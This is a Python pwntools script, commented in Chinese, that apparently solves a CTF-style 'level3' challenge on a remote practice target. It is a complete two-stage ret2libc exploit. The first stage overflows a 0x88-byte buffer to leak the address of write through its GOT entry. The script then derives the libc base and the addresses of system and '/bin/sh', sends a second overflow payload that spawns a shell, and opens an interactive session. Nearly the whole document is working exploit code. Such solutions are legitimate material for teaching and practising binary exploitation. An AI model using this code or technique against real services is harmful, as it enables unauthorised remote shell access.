from pwn import *

io = remote('61.147.171.35',64358)                  #配置好远程靶机连接
elf = ELF('./level3')                               #载入level3程序
libc = ELF('./libc_32.so.6')                        #载入libc函数库


write_plt = elf.plt['write']    #获取write函数的plt地址
write_got = elf.got['write']    #获取write函数的got地址
main_addr = elf.symbols['main'] #获取main函数在程序中的地址

print('write_plt = ' + hex(write_plt))
print('write_got = ' + hex(write_got))

payload1 = b'a'*(0x88+4)+p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(4)
'''
        填满buf和ebp    跳转到write     返回地址    wirte第一个参数     第二个参数  第三个参数
                                                    用于表示输入结果    输出对象    输出字节
                                                    到页面
'''
io.sendlineafter('Input:\n',payload1)                           #输送payload
write_real_addr = u32(io.recv()[:4])               #接收输出的write真实地址，并转换为整数，与p32()相反
print('write_real_addr = ' + hex(write_real_addr))    

base_addr = write_real_addr - libc.symbols['write'] #write的真实地址 - libc库中的偏移地址
system_addr = base_addr + libc.symbols['system']    #libc库基地址 + system函数偏移地址，下面同理
binsh_addr = base_addr + next(libc.search(b'/bin/sh'))

print('base_addr = ' + hex(base_addr))
print('system = ' + hex(system_addr))
print('/bin/sh = ' + hex(binsh_addr))

payload2 = b'a'*(0x88+4) + p32(system_addr) + b'AAAA' + p32(binsh_addr)
'''
        依旧垃圾数据溢出    跳转system函数  返回地址        将/bin/sh作为system函数的参数
                                            4字节随意填
'''

io.sendline(payload2)
io.interactive()    #接受返回的交互窗口
